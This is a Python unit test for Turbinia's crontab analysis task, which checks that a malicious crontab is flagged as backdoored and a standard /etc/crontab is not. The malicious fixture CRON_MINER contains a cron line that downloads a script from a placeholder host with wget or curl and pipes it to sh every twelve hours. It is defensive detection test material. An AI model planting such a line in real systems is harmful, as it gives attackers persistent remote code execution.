# -*- coding: utf-8 -*-
# Copyright 2021 Google Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Tests for the Cron analysis task."""

from __future__ import unicode_literals

import unittest

from turbinia import config
from turbinia.workers import cron


class CronAnalysisTaskTest(unittest.TestCase):
  """test for the Cron analysis task."""

  CRON_MINER = """# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (- installed on Fri Aug 20 03:35:01 2021)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
* */12 * * * (wget -q -O- http://badweb.site/a.sh || curl -fsSL http://badweb.site/a.sh) | sh >/dev/null 2>&1
"""

  REGULAR_CRON = """# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
"""

  CRON_INSECURE_SUMMARY = 'Potentially backdoored crontab found.'
  CRON_INSECURE_REPORT = """#### **Potentially backdoored crontab found.**
* Remote file retrieval piped to a shell."""

  CRON_SECURE_SUMMARY = 'No issues found in crontabs'

  def test_analyse_cron(self):
    """Tests the analyze_cron method."""
    config.LoadConfig()
    task = cron.CronAnalysisTask()

    (report, priority, summary) = task.analyse_crontab(self.CRON_MINER)
    self.assertEqual(report, self.CRON_INSECURE_REPORT)
    self.assertEqual(priority, 20)
    self.assertEqual(summary, self.CRON_INSECURE_SUMMARY)

    (report, priority, summary) = task.analyse_crontab(self.REGULAR_CRON)
    self.assertEqual(summary, self.CRON_SECURE_SUMMARY)


if __name__ == '__main__':
  unittest.main()